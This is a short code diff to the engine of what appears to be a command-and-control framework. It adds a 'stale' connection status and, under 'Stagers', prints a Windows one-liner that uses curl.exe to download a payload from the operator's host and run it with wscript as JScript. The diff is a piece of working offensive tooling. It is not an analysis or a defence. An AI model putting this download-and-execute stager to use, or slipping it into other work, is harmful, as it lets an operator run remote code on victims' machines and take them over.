@@ -31,6 +31,9 @@ class Engine():
             if connection.disconnected():
                 color.error(f'{connection_id}: {connection}', symbol=False)
                 continue
+            if connection.stale():
+                color.information(f'{connection_id}: {connection}', symbol=False)
+                continue
             if connection.status == 'connected':
                 color.success(f'{connection_id}: {connection}', symbol=False)
                 continue
@@ -41,6 +44,7 @@ class Engine():
         color.header('Stagers')
         for stager_id, stager in self.STAGERS.items():
             color.normal(f'{stager.format}: http://{self.ip}:{self.port}/{stager_id}')
+            color.normal(f' - curl.exe http://{self.ip}:{self.port}/{stager_id} -o connected.txt & wscript /e:jscript connected.txt')
         color.normal('')
         return 0, 'Success'
 
